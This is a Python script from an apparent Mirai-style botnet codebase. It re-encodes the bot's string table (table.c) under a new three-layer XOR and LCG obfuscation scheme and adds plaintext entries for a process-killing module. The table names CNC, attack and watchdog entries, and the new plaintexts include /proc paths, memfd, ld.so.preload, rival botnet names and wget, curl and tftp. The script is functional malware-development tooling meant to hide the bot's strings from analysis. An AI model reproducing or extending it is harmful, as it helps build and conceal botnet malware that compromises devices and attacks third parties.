#!/usr/bin/env python3
"""
Re-encode table.c entries from old 2-layer scheme to new 3-layer scheme.
Also encodes new entries (IDs 43+) from known plaintext.

Usage: python3 reencode_table.py [table.c path]
"""

import re
import sys
import os

# ---- derive_key (produces table_key) ----
def derive_key():
    k = 0
    k ^= 0xA3F81C4B0D9E6A27
    k = ((k << 13) | (k >> 51)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x1234567890ABCDEF
    k = ((k << 7) | (k >> 57)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x7B2E9C1D4F6A8E35
    k = ((k << 17) | (k >> 47)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0xD1C4E7A29B3F506C
    return k

TABLE_KEY = derive_key()

# ---- lcg functions ----
def lcg_step(s):
    mul = 0x1234567890ABCDEF ^ 0x4A65A255DC3EB2C2   # = 0x5851F42D4C957F2D
    add = 0x7A3B9C1D4E6F80C2 ^ 0x6E3EE763B908018D   # = 0x14057B7EF767814F
    return (s * mul + add) & 0xFFFFFFFFFFFFFFFF

def lcg2_step(s):
    return (s * 1103515245 + 12345) & 0xFFFFFFFF

# ---- old 2-layer encode/decode (used for existing entries) ----
def old_xor(data, id_):
    state = TABLE_KEY ^ ((id_ + 1) * 0x1f)
    out = bytearray(data)
    for i in range(len(out)):
        state = lcg_step(state)
        out[i] ^= ((id_ * i) + (i * 0x13)) & 0xFF
        out[i] ^= (state >> 32) & 0xFF
    return bytes(out)

# ---- new 3-layer encode/decode ----
def new_xor(data, id_):
    state = TABLE_KEY ^ ((id_ + 1) * 0x1f)
    state2 = (TABLE_KEY >> 32) ^ ((id_ + 1) * 0x3d)
    out = bytearray(data)
    for i in range(len(out)):
        state = lcg_step(state)
        state2 = lcg2_step(state2)
        out[i] ^= ((id_ * i) + (i * 0x13)) & 0xFF
        out[i] ^= (state >> 32) & 0xFF
        out[i] ^= (state2 >> 16) & 0xFF
    return bytes(out)

# ---- Known plaintexts for new entries (IDs 43-66) ----
NEW_PLAINTEXTS = {
    43: b"/stat",
    44: b"/comm",
    45: b"/environ",
    46: b"/fd/0",
    47: b"/fd/5",
    48: b"socket:",
    49: b"UPX",
    50: b"(deleted)",
    51: b"memfd:",
    52: b"raw",
    53: b"packet:",
    54: b"/dev/null",
    55: b"/bin/busybox",
    56: b"/proc/1/ns/pid",
    57: b"/etc/ld.so.preload",
    58: b"/usr\x00/bin\x00/sbin\x00/lib\x00/lib64\x00/opt\x00/systemd\x00/init",
    59: b"/tmp\x00/dev/shm\x00/var/tmp\x00/var/run\x00/run/",
    60: b"init",
    61: b"cron",
    62: b"systemd",
    63: b"kthreadd",
    64: b"REMAITEN\x00POGO\x00HITO\x00KATANA\x00MIUREY\x00BASHMAL\x00XORDD\x00LIGHT\x00FREAK\x00DVR",
    65: b"/proc/net/route",
    66: b"eth\x00wlan\x00enp\x00ra",
}

# ---- Map table define names to IDs ----
TABLE_NAMES = {
    "TABLE_CNC_PORT": 1,
    "TABLE_EXEC_SUCCESS": 2,
    "TABLE_KILLER_PROC": 3,
    "TABLE_KILLER_EXE": 4,
    "TABLE_KILLER_FD": 5,
    "TABLE_KILLER_TCP": 6,
    "TABLE_MEM_ROUTE": 7,
    "nothing1": 8,
    "nothing2": 9,
    "TABLE_ATK_VSE": 10,
    "TABLE_ATK_RESOLVER": 11,
    "TABLE_ATK_NSERV": 12,
    "TABLE_WATCHDOG_1": 13,
    "TABLE_WATCHDOG_2": 14,
    "TABLE_WATCHDOG_3": 15,
    "TABLE_WATCHDOG_4": 16,
    "TABLE_WATCHDOG_5": 17,
    "TABLE_WATCHDOG_6": 18,
    "TABLE_WATCHDOG_7": 19,
    "TABLE_WATCHDOG_8": 20,
    "TABLE_WATCHDOG_9": 21,
    "TABLE_MISC_RAND": 22,
    "TABLE_KILLER_MAPS": 23,
    "TABLE_KILLER_CMDLINE": 24,
    "TABLE_KILLER_STATUS": 25,
    "TABLE_KILLER_SELFEXE": 26,
    "TABLE_KILLER_ANIME": 27,
    "TABLE_MEM_MIRAI": 28,
    "TABLE_MEM_SORA": 29,
    "TABLE_MEM_OWARI": 30,
    "TABLE_MEM_JOSHO": 31,
    "TABLE_MEM_APOLLO": 32,
    "TABLE_MEM_MASUTA": 33,
    "TABLE_MEM_VAMP": 34,
    "TABLE_MEM_QBOT": 35,
    "TABLE_MEM_IRC": 36,
    "TABLE_MEM_SHINTO": 37,
    "TABLE_MEM_OMNI": 38,
    "TABLE_MISC_WGET": 39,
    "TABLE_MISC_CURL": 40,
    "TABLE_MISC_TFTP": 41,
    "TABLE_MISC_REBOOT": 42,
    "TABLE_KILLER_STAT": 43,
    "TABLE_KILLER_COMM": 44,
    "TABLE_KILLER_ENVIRON": 45,
    "TABLE_KILLER_FD0": 46,
    "TABLE_KILLER_FD5": 47,
    "TABLE_KILLER_SOCKET": 48,
    "TABLE_KILLER_UPX": 49,
    "TABLE_KILLER_DELETED": 50,
    "TABLE_KILLER_MEMFD": 51,
    "TABLE_KILLER_RAW": 52,
    "TABLE_KILLER_PACKET": 53,
    "TABLE_KILLER_DEVNULL": 54,
    "TABLE_KILLER_BUSYBOX": 55,
    "TABLE_KILLER_NSPID": 56,
    "TABLE_KILLER_LDPRELOAD": 57,
    "TABLE_KILLER_WHITELIST": 58,
    "TABLE_KILLER_TEMP": 59,
    "TABLE_KILLER_INIT": 60,
    "TABLE_KILLER_CRON": 61,
    "TABLE_KILLER_SYSTEMD": 62,
    "TABLE_KILLER_KTHREADD": 63,
    "TABLE_MEM_EXTRA": 64,
    "TABLE_KILLER_ROUTE": 65,
    "TABLE_KILLER_IFACE": 66,
}

def parse_hex_string(s):
    """Parse a C hex string like \"\\x72\\xAB\" into bytes."""
    # Remove surrounding quotes
    s = s.strip()
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    # Parse \\xHH sequences
    result = []
    i = 0
    while i < len(s):
        if s[i:i+2] == '\\x' and i + 4 <= len(s):
            result.append(int(s[i+2:i+4], 16))
            i += 4
        else:
            # Plain char (shouldn't happen for hex-only strings)
            result.append(ord(s[i]))
            i += 1
    return bytes(result)

def format_hex_string(data):
    """Format bytes as a C hex string like \"\\x72\\xAB\"."""
    parts = ['"']
    for b in data:
        parts.append(f'\\x{b:02X}')
    parts.append('"')
    return ''.join(parts)

def process_table_c(filepath):
    with open(filepath, 'r') as f:
        content = f.read()

    lines = content.split('\n')
    new_lines = []

    # Regex for add_entry line
    # Pattern: add_entry(NAME, "hexstring", length);
    pattern = re.compile(
        r'^\s*add_entry\((\w+),\s*"((?:\\x[0-9A-Fa-f]{2})*)",\s*(\d+)\);'
    )

    for line in lines:
        m = pattern.match(line)
        if m:
            name = m.group(1)
            hex_str = m.group(2)
            decl_len = int(m.group(3))
            id_ = TABLE_NAMES.get(name)

            if id_ is None:
                print(f"WARNING: Unknown table name {name}, keeping as-is")
                new_lines.append(line)
                continue

            old_encoded = parse_hex_string('"' + hex_str + '"')

            if id_ <= 42:
                # Existing entry: decode old, re-encode new
                plaintext = old_xor(old_encoded, id_)
                new_encoded = new_xor(plaintext, id_)
            else:
                # New entry: encode from known plaintext
                if id_ in NEW_PLAINTEXTS:
                    plaintext = NEW_PLAINTEXTS[id_]
                    new_encoded = new_xor(plaintext, id_)
                else:
                    print(f"WARNING: No plaintext known for {name} (id {id_}), keeping as-is")
                    new_lines.append(line)
                    continue

            if len(new_encoded) != decl_len:
                print(f"WARNING: {name}: length mismatch, declared={decl_len}, actual={len(new_encoded)}")

            new_hex = format_hex_string(new_encoded)
            new_line = f'    add_entry({name}, {new_hex}, {len(new_encoded)});'
            new_lines.append(new_line)
            print(f"  {name} (id {id_}): {len(plaintext)} bytes plaintext -> {len(new_encoded)} bytes encoded")
        else:
            new_lines.append(line)

    with open(filepath, 'w') as f:
        f.write('\n'.join(new_lines))

    print(f"\nDone. Wrote {filepath}")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        path = sys.argv[1]
    else:
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           'bot', 'core', 'table.c')
    print(f"Table key = 0x{TABLE_KEY:016X}")
    print(f"Processing {path}...")
    process_table_c(path)
